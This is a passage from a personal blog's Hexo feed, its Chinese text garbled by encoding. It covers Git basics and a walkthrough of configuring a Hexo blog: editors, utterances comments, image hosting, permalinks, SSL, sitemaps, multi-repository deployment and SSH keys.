¹ç›®å½•ä¸‹çš„ nmslæ–‡ä»¶ï¼Œå­ç›®å½•ä¸‹çš„nmslæ–‡ä»¶ä¸å—å½±å“<br></code></pre></td></tr></table></figure><h1 id="git-clone"><a href="#git-clone" class="headerlink" title="git clone"></a>git clone</h1><p>git cloneå‘½ä»¤å¯ä»¥å¤åˆ¶ä¸€ä¸ªç°æœ‰ä»“åº“ï¼Œä¸”ä»“åº“ä¸­åŒ…å«æ‰€æœ‰çš„å†å²ç‰ˆæœ¬</p><p>ä¸‹é¢æ˜¯å‡ ä¸ªå¸¸ç”¨çš„å®é™…æƒ…æ™¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs shell">é€šè¿‡HTTPSçš„æ–¹å¼<br><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> https://github.com/richardchien/modern-cmake-by-example.git</span><br><br>é€šè¿‡sshçš„æ–¹å¼<br><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> git@github.com:richardchien/modern-cmake-by-example.git</span><br><br>é€šè¿‡sshçš„æ–¹å¼ï¼Œå¹¶ä¸”å°†æœ¬åœ°çš„ç›®å½•åå‘½åä¸º wdnmd<br><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> git@github.com:richardchien/modern-cmake-by-example.git wdnmd</span> <br><br>é€šè¿‡sshçš„æ–¹å¼ï¼Œä¸”è¦å…‹éš†çš„æ˜¯æŸä¸ªæœåŠ¡å™¨ä¸Šçš„gitç›®å½•ä»“åº“<br><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">clone</span> user@server:/path.git</span> <br><br><br><br><br></code></pre></td></tr></table></figure><h1 id="git-commit"><a href="#git-commit" class="headerlink" title="git commit"></a>git commit</h1><ul><li>ç›´æ¥è¾“å…¥git commitï¼Œè¿™ç§æ–¹å¼ä¼šå¯åŠ¨æ–‡æœ¬ç¼–è¾‘å™¨ä»¥ä¾¿è¾“å…¥æœ¬æ¬¡æäº¤çš„è¯´æ˜ï¼Œç¼–è¾‘å™¨æ˜¯Vim</li><li>git commit -m â€œxxxxâ€ï¼Œè¿™ç§æ–¹å¼è¡¨ç¤ºæœ¬æ¬¡æäº¤è¯´æ˜æ˜¯å¼•å·ä¸­çš„xxx</li><li>git commit -a -m â€˜xxxxâ€™ è¿™ç§æ–¹å¼è·³è¿‡git addçš„è¿‡ç¨‹ç›´æ¥å°†æ‰€æœ‰æ–‡ä»¶åŠ å…¥åˆ°æš‚å­˜åŒºç„¶åæäº¤</li></ul><h1 id="git-log"><a href="#git-log" class="headerlink" title="git log"></a>git log</h1><p>è¯¥å‘½ä»¤ä¼šæ‰“å°å‡ºæ‰€æœ‰çš„æäº¤å†å²ï¼Œä¼šæŒ‰æäº¤æ—¶é—´åˆ—å‡ºæ‰€æœ‰çš„æ›´æ–°ï¼Œæœ€è¿‘çš„æ›´æ–°æ’åœ¨æœ€ä¸Šé¢ï¼Œæ¯æ¬¡æ›´æ–°éƒ½æœ‰ä¸€ä¸ª SHA-1 æ ¡éªŒå’Œã€ä½œè€…çš„åå­—å’Œç”µå­é‚®ä»¶åœ°å€ã€æäº¤æ—¶é—´ï¼Œæœ€åç¼©è¿›ä¸€ä¸ªæ®µè½æ˜¾ç¤ºæäº¤è¯´æ˜</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> git <span class="hljs-built_in">log</span> -p -2</span><br></code></pre></td></tr></table></figure><p>-p é€‰é¡¹å±•å¼€æ˜¾ç¤ºæ¯æ¬¡æäº¤çš„å†…å®¹å·®å¼‚<br>-2 åˆ™ä»…æ˜¾ç¤ºæœ€è¿‘çš„ä¸¤æ¬¡æ›´æ–°ï¼š</p><h1 id="git-push"><a href="#git-push" class="headerlink" title="git push"></a>git push</h1><p>git push æ˜¯ç”¨æ¥å°†æœ¬åœ°ä»“åº“ä¸­çš„æ•°æ®æ¨é€åˆ°è¿œç¨‹ä»“åº“</p><p>å¦‚æœè¦æŠŠæœ¬åœ°çš„ master åˆ†æ”¯æ¨é€åˆ° origin æœåŠ¡å™¨ä¸Šï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¯­å¥ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">git push [remote-name] [branch-name]<br></code></pre></td></tr></table></figure><h1 id="git-åˆ†æ”¯"><a href="#git-åˆ†æ”¯" class="headerlink" title="git åˆ†æ”¯"></a>git åˆ†æ”¯</h1><p>//TODO</p><h2 id="æ€ç»´å¯¼å›¾"><a href="#æ€ç»´å¯¼å›¾" class="headerlink" title="æ€ç»´å¯¼å›¾"></a>æ€ç»´å¯¼å›¾</h2><p><img src="https://img-blog.csdnimg.cn/b7e61a1b29db4f1f97c7d26ea44b5c5a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16"></p><p>è¯¥å›¾æ¥è‡ªå¾®ä¿¡å…¬ä¼—å·ï¼šç»¯æµ…yousa</p><h1 id="Gitèµ„æ–™æ¨è"><a href="#Gitèµ„æ–™æ¨è" class="headerlink" title="Gitèµ„æ–™æ¨è"></a>Gitèµ„æ–™æ¨è</h1><p>ç½‘é¡µåœ¨çº¿èµ„æ–™</p><ul><li><a href="https://ohshitgit.com/">ohshitgit</a></li><li><a href="https://gitee.com/progit/index.html">Pro Gitï¼ˆä¸­æ–‡ç‰ˆï¼‰</a></li><li><a href="https://github.com/geeeeeeeeek/git-recipes">git-recipes</a></li></ul><p>ä¹¦ç±</p><ul><li>Githubå…¥é—¨ä¸å®è·µ</li><li>Gitå›¢é˜Ÿåä½œ</li></ul><p>å¯è§†åŒ–çš„ Git åœ¨çº¿å­¦ä¹ ç½‘ç«™</p><ul><li><a href="https://learngitbranching.js.org/?locale=zh_CN">learngit</a></li></ul><p><a href="https://eagain.net/articles/git-for-computer-scientists/">https://eagain.net/articles/git-for-computer-scientists/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>hexoåšå®¢é…ç½® all in one</title>
    <link href="/p/19ab6481/"/>
    <url>/p/19ab6481/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/hexo.jpeg"></p><p>æœ¬æ–‡è®°å½•äº†æˆ‘åŸºäºhexoæ„å»ºçš„åšå®¢çš„ä¸€äº›é…ç½®</p><h1 id="åšå®¢è¿ç§»ã€å¤šè®¾å¤‡å†™ä½œ"><a href="#åšå®¢è¿ç§»ã€å¤šè®¾å¤‡å†™ä½œ" class="headerlink" title="åšå®¢è¿ç§»ã€å¤šè®¾å¤‡å†™ä½œ"></a>åšå®¢è¿ç§»ã€å¤šè®¾å¤‡å†™ä½œ</h1><h2 id="å®‰è£…-hexo"><a href="#å®‰è£…-hexo" class="headerlink" title="å®‰è£… hexo"></a>å®‰è£… hexo</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">brew install git<br><br>brew install node<br><br>npm install -g hexo-cli<br></code></pre></td></tr></table></figure><ul><li>ä¸‹è½½nodejs<ul><li>å»ºè®®ä½¿ç”¨scoopä¸‹è½½</li></ul></li><li>ä½¿ç”¨npmä¸‹è½½hexo<ul><li><code>npm install -g hexo-cli</code></li></ul></li></ul><p>å‘½ä»¤è¡Œè¿›å…¥åˆ°C:\hexoç›®å½•</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel">hexo <span class="hljs-built_in">n</span> <span class="hljs-string">&quot;&quot;</span><br>hexo d -g<br></code></pre></td></tr></table></figure><h2 id="å‹ç¼©åŒ…"><a href="#å‹ç¼©åŒ…" class="headerlink" title="å‹ç¼©åŒ…"></a>å‹ç¼©åŒ…</h2><p>ç›´æ¥å¤åˆ¶ç²˜è´´ä¼šç ´åä¿®æ”¹æ—¥æœŸï¼Œå¯¼è‡´åšå®¢æ–‡ç« ä¹±åºï¼ŒæŠŠæ•´ä¸ªæ–‡ä»¶å¤¹æ‰“æˆå‹ç¼©åŒ…å¯ä»¥é¿å…ä¿®æ”¹æ—¥æœŸçš„å˜åŒ–</p><p>æ­¥éª¤ï¼šå°†åŸå…ˆç”µè„‘çš„hexoæ–‡ä»¶å¤¹æ‰“æˆå‹ç¼©åŒ…ï¼Œç„¶åå¤åˆ¶åˆ°æ–°ç”µè„‘ï¼Œè§£å‹ï¼ˆæ¯”å¦‚C:\hexoç›®å½•ï¼‰</p><blockquote><p>è¿™é‡Œä¸ç›´æ¥å¤åˆ¶çš„åŸå› æ˜¯ï¼Œä¼šæ”¹å˜åšå®¢æ–‡ä»¶çš„æœ€è¿‘ä¿®æ”¹æ—¶é—´ï¼Œä»è€Œå¯¼è‡´é¡ºåºæ··ä¹±</p></blockquote><h1 id="ç¼–è¾‘å™¨"><a href="#ç¼–è¾‘å™¨" class="headerlink" title="ç¼–è¾‘å™¨"></a>ç¼–è¾‘å™¨</h1><p>typora</p><ul><li>è®¾ç½®font matterï¼Œä¹Ÿå³æ˜¯ä¸¤è¡Œ<code>---</code>æ¡†èµ·æ¥çš„ä»£ç <br><a href="#emoji">hexoåšå®¢é…ç½® all in one</a>```c</li></ul><hr><p>title: hexoåšå®¢é…ç½®<br>tags: [hexo]<br>typora-root-url: ../<br>abbrlink: 19ab6481<br>index_img: /image/hexo.jpeg<br>categories: </p><hr><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><code class="hljs awk">- è®¾ç½®picgoä¸Šä¼ å›¾ç‰‡<br><br>obsidian<br>- é…ç½®ä¸»é¢˜ï¼ˆé»˜è®¤ä¸»é¢˜å®åœ¨æ˜¯å¤ªä¸‘äº†ï¼‰<br>- æ¨èminimalå’ŒBlue Topaz<br>- æ­é…style settingæ’ä»¶å¯ä»¥å®šåˆ¶ä¸€ä¸‹ä¸»é¢˜<br>- é…ç½®å›¾ç‰‡è·¯å¾„<br>- è®¾ç½®-ã€‹æ–°å»ºç¬”è®°çš„å­˜æ”¾ä½ç½®-ã€‹å½“å‰æ–‡ä»¶æ‰€åœ¨çš„æ–‡ä»¶å¤¹<br>- è®¾ç½®-ã€‹æ ¸å¿ƒæ’ä»¶-ã€‹æ‰“å¼€å·¥ä½œåŒºã€æ–œæ å‘½ä»¤<br>- open å·²å­˜åœ¨çš„æ–‡ä»¶å¤¹(ä¹Ÿå³æ˜¯_postæ–‡ä»¶å¤¹)ï¼Œå¦‚æœæ‰“å¼€çš„æ˜¯hexoæ ¹æ–‡ä»¶å¤¹é‚£ä¹ˆå›¾ç‰‡æ— æ³•æ­£å¸¸æ˜¾ç¤º<br>- æ¨¡æ¿åŠŸèƒ½ï¼šåœ¨_postæ–‡ä»¶å¤¹ä¸‹æ–°å»ºä¸€ä¸ªtemplateæ–‡ä»¶å¤¹ï¼Œåˆ›å»ºæ–‡ä»¶å¹¶åœ¨å…¶ä¸­å†™å…¥ä½ æƒ³å¿«é€Ÿæ’å…¥çš„å†…å®¹ï¼Œè¿™æ ·åœ¨æ–°å»ºæ–‡ä»¶ä¹‹åå¯ä»¥å¿«é€Ÿç”Ÿæˆæ¨¡æ¿å†…å®¹ï¼Œä»è€Œé¿å…å‘½ä»¤è¡Œè¿è¡Œhexo n â€œtitleâ€å‘½ä»¤<br><br>æˆ‘çš„obçš„æ•ˆæœï¼š<br>![](https:<span class="hljs-regexp">//img</span>.gls.show<span class="hljs-regexp">/img/</span><span class="hljs-number">20230810160851</span>.png)<br><br><span class="hljs-comment"># è¯„è®ºåŠŸèƒ½</span><br><br>å¯ä»¥ä½¿ç”¨å¤šç§æ’ä»¶æ”¯æŒåšå®¢è¯„è®ºåŠŸèƒ½ï¼Œæ¯”å¦‚ï¼š<br>- [ValineÂ (opens new window)](https:<span class="hljs-regexp">//</span>valine.js.org/configuration.html):åŸºäº LeanCloud<br>- [WalineÂ (opens new window)](https:<span class="hljs-regexp">//</span>waline.js.org/): ä» Valine è¡ç”Ÿè€Œæ¥ï¼Œé¢å¤–å¢åŠ äº†æœåŠ¡ç«¯å’Œå¤šç§åŠŸèƒ½<br>- [GitalkÂ (opens new window)](https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/gitalk/gi</span>talk): åŸºäº GitHub Issues<br>- [UtterancesÂ (opens new window)](https:<span class="hljs-regexp">//u</span>tteranc.es/): åŸºäº GitHub Issues<br><br>æˆ‘é€‰æ‹©äº†utterances~~å› ä¸ºæ¯”è¾ƒç®€å•~~<br><br><span class="hljs-comment">## éƒ¨ç½²æ­¥éª¤</span><br><br><span class="hljs-number">1</span>.å®‰è£…utterances<br>å®‰è£…é¡µé¢ï¼š[GitHub Apps - utterances Â· GitHub](https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/apps/u</span>tterances)ï¼Œé€‰æ‹©ä½ çš„githubä»“åº“å³å¯<br><br><span class="hljs-number">2</span>.æ›´æ”¹fluidé…ç½®<br><br>[é…ç½®æŒ‡å— | Hexo Fluid ç”¨æˆ·æ‰‹å†Œ](https:<span class="hljs-regexp">//</span>hexo.fluid-dev.com<span class="hljs-regexp">/docs/gui</span>de/<span class="hljs-comment">#%E5%8D%9A%E5%AE%A2%E6%A0%87%E9%A2%98)</span><br><br>```yaml<br>  <span class="hljs-comment"># è¯„è®ºæ’ä»¶</span><br>  <span class="hljs-comment"># Comment plugin</span><br>  comments:<br>    enable: true <span class="hljs-comment"># change into true</span><br>    <span class="hljs-comment"># æŒ‡å®šçš„æ’ä»¶ï¼Œéœ€è¦åŒæ—¶è®¾ç½®å¯¹åº”æ’ä»¶çš„å¿…è¦å‚æ•°</span><br>    <span class="hljs-comment"># The specified plugin needs to set the necessary parameters at the same time</span><br>    <span class="hljs-comment"># Options: utterances | disqus | gitalk | valine | waline | changyan | livere | remark42 | twikoo | cusdis</span><br>    type: utterances<br><br><br><span class="hljs-comment">#---------------------------</span><br><span class="hljs-comment"># è¯„è®ºæ’ä»¶</span><br><span class="hljs-comment"># Comment plugins</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># å¼€å¯è¯„è®ºéœ€è¦å…ˆè®¾ç½®ä¸Šæ–¹ `post: comments: enable: true`ï¼Œç„¶åæ ¹æ® `type` è®¾ç½®ä¸‹æ–¹å¯¹åº”çš„è¯„è®ºæ’ä»¶å‚æ•°</span><br><span class="hljs-comment"># Enable comments need to be set `post: comments: enable: true`, then set the corresponding comment plugin parameters below according to `type`</span><br><span class="hljs-comment">#---------------------------</span><br><br><span class="hljs-comment"># Utterances</span><br><span class="hljs-comment"># åŸºäº GitHub Issues</span><br><span class="hljs-comment"># Based on GitHub Issues</span><br><span class="hljs-comment"># See: https://utteranc.es</span><br>utterances:<br>  repo: LaPhilosophie/gls.show <span class="hljs-comment"># add repo info</span><br>  issue_term: pathname<br>  label: utterances<br>  theme: github-light<br>  theme_dark: github-dark<br>  crossorigin: anonymous<br><br></code></pre></td></tr></table></figure><h1 id="å›¾ç‰‡å¤–é“¾"><a href="#å›¾ç‰‡å¤–é“¾" class="headerlink" title="å›¾ç‰‡å¤–é“¾"></a>å›¾ç‰‡å¤–é“¾</h1><p>ç»™åšå®¢ç”Ÿæˆå›¾ç‰‡å¤–é“¾æ˜¯ä¸€ä¸ªæ¯”è¾ƒå¤´ç–¼çš„äº‹æƒ…ï¼Œä¸€èˆ¬çš„å¸¸è§„åšæ³•æ˜¯éƒ¨ç½²ä¸€ä¸ªå›¾åºŠæœåŠ¡ï¼ŒæŠŠå›¾ç‰‡ä¸ŠåºŠåˆ°å›¾åºŠï¼Œç„¶åå°†å›¾ç‰‡é“¾æ¥å¤åˆ¶åˆ°åšå®¢ä¸­</p><p>æ¯”å¦‚ï¼š</p><ul><li>ä½¿ç”¨ä¸ƒç‰›äº‘+picgoçš„ç»„åˆ</li><li>ä½¿ç”¨lycheeç­‰å›¾åºŠéƒ¨ç½²åœ¨è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œç”Ÿæˆå¤–é“¾</li></ul><p>ä½†æ˜¯ä¸€æ—¦è¿ç§»æœåŠ¡å™¨æˆ–è€…æ›´æ¢åŸŸåï¼Œå¤–é“¾éƒ½ä¼šæŒ‚æ‰</p><p>æˆ‘çš„ä¸ªäººé…ç½®æ˜¯ï¼Œåœ¨æ¯ä¸ªmdæ–‡ä»¶å¼€å¤´å†™ä¸Šï¼š</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arcade">typora-root-url: ../<br><br>index_img: <span class="hljs-regexp">/image/</span>wdnmd.jpg<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±å¯ä»¥ä½¿ç”¨ä¸Šä¸€ä¸ªç›®å½•çš„æ–‡ä»¶å¤¹/imageä¸‹çš„wdnmd.jpgçš„å›¾ç‰‡</p><p>2023-6-13å›¾ç‰‡å¤–é“¾æ›´æ–°ï¼š</p><p>ä½¿ç”¨è…¾è®¯äº‘å¯¹è±¡å­˜å‚¨+PicGo+typora</p><ul><li>è…¾è®¯äº‘ï¼šé…ç½®cdnã€sslã€è¯ä¹¦ã€åŸŸåã€å­˜å‚¨æ¡¶ç­‰ï¼ŒæŒ‰ç…§è…¾è®¯äº‘å®˜ç½‘çš„æ–‡æ¡£å³å¯ï¼ˆè¿™ä¸ªè¯ä¹¦è®¤è¯å’Œcdnè¿˜æ˜¯æ¯”è¾ƒè›‹ç–¼çš„ï¼‰</li><li>PicGoï¼šå®‰è£…å¹¶é…ç½®å®¢æˆ·ç«¯</li><li>typoraï¼šæ’å…¥å›¾ç‰‡æ—¶ä¸Šä¼ å›¾ç‰‡</li></ul><p><img src="https://img.gls.show/img/20230816112629.png"></p><p>ç›¸å…³çš„idå’Œkeyä¿¡æ¯å¯ä»¥åœ¨æ§åˆ¶å°çœ‹åˆ°ï¼š</p><ul><li><a href="https://console.cloud.tencent.com/cam/capi">https://console.cloud.tencent.com/cam/capi</a></li><li><a href="https://console.cloud.tencent.com/cos/bucket">https://console.cloud.tencent.com/cos/bucket</a></li></ul><h1 id="æ–‡ç« å¤–é“¾ä¼˜åŒ–"><a href="#æ–‡ç« å¤–é“¾ä¼˜åŒ–" class="headerlink" title="æ–‡ç« å¤–é“¾ä¼˜åŒ–"></a>æ–‡ç« å¤–é“¾ä¼˜åŒ–</h1><p>hexoé»˜è®¤çš„æ–‡ç« é“¾æ¥æ˜¯åŸŸå/å¹´/æœˆ/æ—¥ï¼Œå¤åˆ¶ä¹‹åç”±äºæ±‰å­—è½¬ä¹‰ä¼šæœ‰å¾ˆé•¿çš„ä¹±ç å‡ºç°ï¼Œä¸åˆ©äºé˜…è¯»</p><p>å¯ä»¥ä½¿ç”¨<a href="https://github.com/Rozbo/hexo-abbrlink">æ’ä»¶</a>è§£å†³</p><p>ä¿®æ”¹<code>_config.yml</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">permalink: p/:abbrlink/<br><br>abbrlink:<br>  alg: crc32  #ç®—æ³•: crc16(<span class="hljs-keyword">default</span>) <span class="hljs-keyword">and</span> crc32<br>  rep: hex    #è¿›åˆ¶: dec(<span class="hljs-keyword">default</span>) <span class="hljs-keyword">and</span> hex<br></code></pre></td></tr></table></figure><p>ä¼˜åŒ–åçš„åšå®¢é“¾æ¥ï¼š<a href="https://gls.show/p/f9220a0b/">https://gls.show/p/f9220a0b/</a></p><h1 id="é…ç½®ç½‘ç«™ssl"><a href="#é…ç½®ç½‘ç«™ssl" class="headerlink" title="é…ç½®ç½‘ç«™ssl"></a>é…ç½®ç½‘ç«™ssl</h1><p>è…¾è®¯äº‘æ§åˆ¶å°-ã€‹ç”³è¯·å…è´¹è¯ä¹¦-ã€‹æˆ‘çš„è¯ä¹¦-ã€‹ä¸‹è½½-ã€‹é€‰æ‹©nginx-ã€‹å°†gls.show.keyå’Œgls.show_bundle.crtæ–‡ä»¶é€šè¿‡scpæˆ–è€…filezillaå¤åˆ¶åˆ°/etc/nginxç›®å½•ä¸‹-ã€‹sudo nginx -s reloadæˆ–è€…sudo service nginx restart</p><h1 id="seoä¼˜åŒ–"><a href="#seoä¼˜åŒ–" class="headerlink" title="seoä¼˜åŒ–"></a>seoä¼˜åŒ–</h1><p>ç”Ÿæˆsitemap</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">npm <span class="hljs-keyword">install </span>hexo-generator-sitemap --save<br>npm <span class="hljs-keyword">install </span>hexo-generator-<span class="hljs-keyword">baidu-sitemap </span>--save<br></code></pre></td></tr></table></figure><h1 id="å°†åšå®¢åŒæ—¶æ¨é€åˆ°ä¸¤ä¸ªgit"><a href="#å°†åšå®¢åŒæ—¶æ¨é€åˆ°ä¸¤ä¸ªgit" class="headerlink" title="å°†åšå®¢åŒæ—¶æ¨é€åˆ°ä¸¤ä¸ªgit"></a>å°†åšå®¢åŒæ—¶æ¨é€åˆ°ä¸¤ä¸ªgit</h1><p>å¯å‚è€ƒå®˜æ–¹æ‰‹å†Œï¼š<a href="https://hexo.io/docs/one-command-deployment">https://hexo.io/docs/one-command-deployment</a></p><p>You can use multiple deployers. Hexo will execute each deployer in order.</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repository :</span> <span class="hljs-string">git@gls.show:xx/hexo.git</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">master</span><br><span class="hljs-bullet">-</span> <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repository :</span> <span class="hljs-string">git@github.com:LaPhilosophie/blog.git</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">master</span><br></code></pre></td></tr></table></figure><h1 id="å‘è¡¨åšå®¢"><a href="#å‘è¡¨åšå®¢" class="headerlink" title="å‘è¡¨åšå®¢"></a>å‘è¡¨åšå®¢</h1><p>æ–°å»ºåšå®¢</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs excel">hexo <span class="hljs-built_in">n</span> <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>æœ¬åœ°æµ‹è¯•</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo s</span><br></code></pre></td></tr></table></figure><p>åˆ›å»ºé™æ€é¡µé¢</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo g</span><br></code></pre></td></tr></table></figure><p>éƒ¨ç½²é¡µé¢</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">hexo d</span><br></code></pre></td></tr></table></figure><h1 id="è®¾ç½®æ–‡ç« å±æ€§"><a href="#è®¾ç½®æ–‡ç« å±æ€§" class="headerlink" title="è®¾ç½®æ–‡ç« å±æ€§"></a>è®¾ç½®æ–‡ç« å±æ€§</h1><p>æ˜¯å¦å¯è§ï¼š</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dart"><span class="hljs-keyword">hide</span>: <span class="hljs-keyword">false</span>/<span class="hljs-keyword">true</span><br></code></pre></td></tr></table></figure><p>è®¾ç½®ç½®é¡¶ï¼š<br>å¯ä»¥åœ¨æ–‡ç« å¼€å¤´ Front-matter (opens new window)ä¸­é…ç½® sticky å±æ€§ã€‚sticky æ•°å€¼è¶Šå¤§ï¼Œè¯¥æ–‡ç« è¶Šé å‰ï¼Œè¾¾åˆ°ç±»ä¼¼äºç½®é¡¶çš„æ•ˆæœï¼Œå…¶ä»–æœªè®¾ç½®çš„æ–‡ç« ä¾ç„¶æŒ‰é»˜è®¤æ’åº</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">sticky</span>: <span class="hljs-number">100</span><br></code></pre></td></tr></table></figure><h1 id="å…å¯†éƒ¨ç½²"><a href="#å…å¯†éƒ¨ç½²" class="headerlink" title="å…å¯†éƒ¨ç½²"></a>å…å¯†éƒ¨ç½²</h1><p>å°†<code>wdnmd.pub</code>æ”¾åœ¨gitç”¨æˆ·çš„.sshæ–‡ä»¶å¤¹ä¸‹çš„authorized_keysä¸­</p><p>æœ¬åœ°ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-built_in">eval</span> $(ssh-agent)<br><br>ssh-add ~<span class="hljs-regexp">/.ssh/</span>wdnmd<br></code></pre></td></tr></table></figure><h1 id="emoji"><a href="#emoji" class="headerlink" title="emoji"></a>emoji</h1><ul><li><p>æƒ³è¦åœ¨åšå®¢ä¸­æ’å…¥emojiï¼Œå¯ä»¥ä½¿ç”¨ç½‘ç«™<a href="https://emoji.muan.co/">https://emoji.muan.co/</a></p><ul><li>è¯¥ç½‘ç«™å·²è¢«å¢™ğŸ˜…</li></ul></li><li><p>æ›¾å°è¯•è¿‡Markdownè‡ªå¸¦çš„emojiï¼Œåœ¨ä½ æœ¬åœ°çš„mdæ–‡ä»¶ä¸­æ˜¯å¯ä»¥çœ‹åˆ°çš„ï¼Œä½†æ˜¯åœ¨ç½‘é¡µä¸­æ— æ³•æ˜¾ç¤º</p></li></ul><p>emoji.muan.co æ•ˆæœæµ‹è¯•ï¼š</p><p>ğŸš ğŸš…âœˆï¸ğŸš’</p><h1 id="å¢åŠ ç½‘é¡µjs"><a href="#å¢åŠ ç½‘é¡µjs" class="headerlink" title="å¢åŠ ç½‘é¡µjs"></a>å¢åŠ ç½‘é¡µjs</h1><p>æ¯”å¦‚å¢åŠ åŠ¨æ€å½©å¸¦æ•ˆæœï¼š</p><p>åœ¨_config.fluidä¸­æ·»åŠ </p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;/js/caidai.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>åœ¨<code>Hexo\source\js</code>æ–‡ä»¶å¤¹ä¸­å¢åŠ <code>caidai.js</code>æ–‡ä»¶ï¼Œå†™å…¥<a href="https://cdn.jsdelivr.net/gh/bynotes/texiao/source/js/caidai.js">ç½‘å€ä¸­å†…å®¹</a></p><h1 id="ä½¿ç”¨-vscode-å†™Markdown"><a href="#ä½¿ç”¨-vscode-å†™Markdown" class="headerlink" title="ä½¿ç”¨ vscode å†™Markdown"></a>ä½¿ç”¨ vscode å†™Markdown</h1><ul><li>å®‰è£…æ’ä»¶ï¼šMarkdown image ã€Markdown 